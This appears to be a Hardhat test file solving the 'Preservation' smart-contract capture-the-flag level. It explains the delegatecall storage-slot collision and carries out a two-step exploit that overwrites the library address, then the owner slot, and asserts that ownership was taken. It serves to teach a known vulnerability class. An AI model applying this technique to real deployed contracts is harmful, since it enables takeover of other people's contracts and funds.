const { expect } = require("chai");
const { ethers } = require("hardhat");

/**

██████╗░██████╗░███████╗░██████╗███████╗██████╗░██╗░░░██╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔══██╗██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██║░░░██║██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
██████╔╝██████╔╝█████╗░░╚█████╗░█████╗░░██████╔╝╚██╗░██╔╝███████║░░░██║░░░██║██║░░██║██╔██╗██║
██╔═══╝░██╔══██╗██╔══╝░░░╚═══██╗██╔══╝░░██╔══██╗░╚████╔╝░██╔══██║░░░██║░░░██║██║░░██║██║╚████║
██║░░░░░██║░░██║███████╗██████╔╝███████╗██║░░██║░░╚██╔╝░░██║░░██║░░░██║░░░██║╚█████╔╝██║░╚███║
╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═════╝░╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝

 * Goal: 
 * 
 * This contract utilizes a library to store two different times for two different timezones. 
 * The constructor creates two instances of the library for each time to be stored.
 * The goal of this level is for you to claim ownership of the instance you are given.
 * 
 * Solution:
 *
 * To solve this level, you need to know how the low-level delegatecall function works. [see the notes]
 * As we can see, the variable we are interested in is in slot 2 (owner) and the only access we have are the 
 * functions setFirstTime and setSecondTime.
 * Both functions delegate a call to their respective contracts. 
 * The flaw is that these libraries are actually contracts (they are not labeled library, but contract) and 
 * this implies some vulnerabilities in that it is possible to modify the delegator's (Preservation) storage 
 * by modifying the delegate's (Attacker's) storage.
 * So our goal is to use a malicious contract that goes to modify slot 2 of the Preservation contract. 
 * the only access we have is from the setFirstTime and setSecondTime functions. 
 * So by calling the former or the latter and passing it the address of our malicious contract, we could replace 
 * that in slot 0 or 1. 
 * We will then only need to have written a setTime function in the malicious contract that replaces its slot 2 
 * with the player's address. 
 * So by calling the previously called function again the setTime we will have written will replace the storage 
 * of the malicious contract and the storage of the Preservation contract.
 * 
 * Note:
 * 
 * The advantage of delegatecall() is that you can preserve your current, 
 * calling contract’s context. This context includes its storage and its 
 * msg.sender, msg.value attributes.
 * When contract A makes a delegatecall to Contract B, it allows Contract B 
 * to freely mutate its storage A.
 * 
 */
describe("Preservation", function () {
    let preservation, preservationAttacker, libraryContract1, libraryContract2, owner, player;

    before(async function () {
        [owner, player] = await ethers.getSigners();

        const LibraryContract1 = await ethers.getContractFactory("contracts/Preservation/Preservation.sol:LibraryContract");
        libraryContract1 = await LibraryContract1.connect(owner).deploy();

        const LibraryContract2 = await ethers.getContractFactory("contracts/Preservation/Preservation.sol:LibraryContract");
        libraryContract2 = await LibraryContract2.connect(owner).deploy();

        const Preservation = await ethers.getContractFactory("contracts/Preservation/Preservation.sol:Preservation");
        preservation = await Preservation.connect(owner).deploy(libraryContract1.address, libraryContract2.address);

        const PreservationAttacker = await ethers.getContractFactory("contracts/Preservation/PreservationAttacker.sol:PreservationAttacker");
        preservationAttacker = await PreservationAttacker.connect(player).deploy();
    });

    it("Should properly steal the ownership", async function () {
        // preservation storage before exploit
        console.table([await preservation.timeZone1Library(), await preservation.timeZone2Library(), await preservation.owner()]);

        // exploit p.1
        await preservation.connect(player).setFirstTime(preservationAttacker.address);

        // preservation storage after exploit p.1, the slot 0 must be change with malicious contract
        console.table([await preservation.timeZone1Library(), await preservation.timeZone2Library(), await preservation.owner()]);

        // exploit p.2
        await preservation.connect(player).setFirstTime(player.address);

        // preservation storage after exploit p.2, the slot 2 must be change with player address
        console.table([await preservation.timeZone1Library(), await preservation.timeZone2Library(), await preservation.owner()]);

        expect(await preservation.connect(player).owner()).to.be.eq(player.address);
    });
});
